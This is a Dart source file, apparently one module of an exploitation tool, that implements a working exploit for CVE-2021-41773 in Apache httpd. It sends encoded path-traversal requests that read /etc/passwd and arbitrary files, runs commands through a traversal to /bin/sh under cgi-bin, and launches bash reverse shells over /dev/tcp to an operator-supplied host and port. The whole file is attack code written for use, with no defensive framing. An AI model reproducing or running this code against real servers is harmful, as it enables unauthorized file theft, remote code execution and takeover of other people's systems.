import '../../../core/net/raw_http_client.dart';

import 'exp_result.dart';

class ApacheHttpdExpService {
  final String baseUrl;
  final Duration timeout;

  ApacheHttpdExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  final RawHttpClient _rawClient = const RawHttpClient();

  Future<String?> _sendRawHttp({
    required String method,
    required String rawPath,
    String? body,
    Map<String, String>? headers,
  }) async {
    final res = await _rawClient.send(
      baseUrl: _base,
      request: RawHttpRequest(
        method: method,
        rawPath: rawPath,
        headers: headers ?? const {},
        body: body ?? '',
      ),
    );
    return res?.body;
  }

  Future<ExpResult> check() async {
    try {
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
        if ((body ?? '').contains('root:') ||
            (body ?? '').contains('/bin/sh') ||
            (body ?? '').contains('/bin/bash')) {
          return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
        }
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-41773', '');
  }

  Future<String?> readFile(String filePath) async {
    try {
      final normalizedPath = filePath.startsWith('/') ? filePath : '/$filePath';
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e$normalizedPath',
        '/icons/.%2e/%2e%2e/%2e%2e$normalizedPath',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(method: 'GET', rawPath: rawPath);
        if (body != null && body.isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(String cmd) async {
    try {
      final candidates = [
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh',
      ];
      for (final rawPath in candidates) {
        final body = await _sendRawHttp(
          method: 'POST',
          rawPath: rawPath,
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'echo;$cmd',
        );
        if (body != null && body.trim().isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<bool> getShell({
    required String lhost,
    required int lport,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = 'bash -i >& /dev/tcp/$host/$lport 0>&1';
    final out = await execRce(cmd);
    // Reverse shell usually has no useful HTTP body; success is request accepted.
    return out != null;
  }

  Future<bool> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = preferScript
        ? "bash -c 'export TERM=xterm-256color; "
            "if command -v script >/dev/null 2>&1; then "
            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
            "elif command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
        : "bash -c 'export TERM=xterm-256color; "
            "if command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
    final out = await execRce(cmd);
    return out != null;
  }
}

